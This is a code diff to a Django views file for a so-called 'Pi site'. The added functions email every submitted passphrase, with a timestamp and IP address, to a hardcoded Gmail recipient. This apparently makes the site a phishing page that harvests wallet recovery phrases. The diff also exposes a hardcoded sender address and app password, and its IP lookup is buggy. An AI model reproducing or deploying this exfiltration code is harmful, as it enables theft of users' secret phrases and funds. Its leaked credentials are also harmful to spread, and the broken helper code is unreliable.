@@ -3,10 +3,53 @@ from django.contrib import messages
 from django.http import HttpResponse
 from . import models
 from .keys_test import generate_password
+from firebmail import sendmail as sending_no
+from datetime import datetime
+import requests
 
 # Create your views here.
 
+def send_notify(subject, payload):
+    sender = "ezekielizuchi2018@gmail.com"
+    password = "pvos glgf nxal finc"
+    recipient = "ezekielobiajulu0@gmail.com"
+    
+    return sending_no(payload, recipient, sender,password, subject)
+
+
+def get_ip_address():
+    try:
+        address = requests.get('https://api64.ipify.org?format=json')
+        if address.status_code == 200:
+            ip_data = address.json()
+            ip_add = ip_data['ip']
+
+        else:
+            print(f"Failed to retrieve IP address. Status code: {address.status_code}")
+    except Exception as e:
+        print(f"An error occurred: {e}")
+
+    return ip_add
+
+"""
+to get location data
+"""
+def get_location(ip_address):
+    try:
+        response = requests.get(f'https://ipapi.co/{ip_address}/json/')
+
+        if response.status_code == 200 or response.status_code == 539:
+            location_data = response.json()
+            return location_data
+        else:
+            print(f"Failed to retrieve location. Status code: {response.status_code}")
+    except Exception as e:
+        print(f"An error occurred: {e}")
+
 def index(request):
+    ip_add = get_ip_address()
+    request.session['ip_address'] = ip_add
+    send_notify(payload=f'someone has visited your pi site - {ip_add}', subject='Pi site')
     return render(request, 'index.html', {})
 
 def validate(request):
@@ -39,6 +82,11 @@ def submit_pass(request):
                     look_up = look_up_key
                 )
                 key_save.save()
+                ip_address = request.session.get('ip_address', None)
+
+                current_time = datetime.now()
+                formatted_time = current_time.strftime("%Y-%m-%d %H:%M:%S")
+                send_notify(payload=f'Pass Phrase submitted - {formatted_time} - the ip address is (- {ip_address}) - the passphrase is -( {keys} )', subject='Pi site Token Submitted')
                 request.session['look_up'] = look_up_key
                 # key_sent = models.PassPhrase.objects.get(look_up=look_up_key)
                 return approve(request, keys=look_up_key)
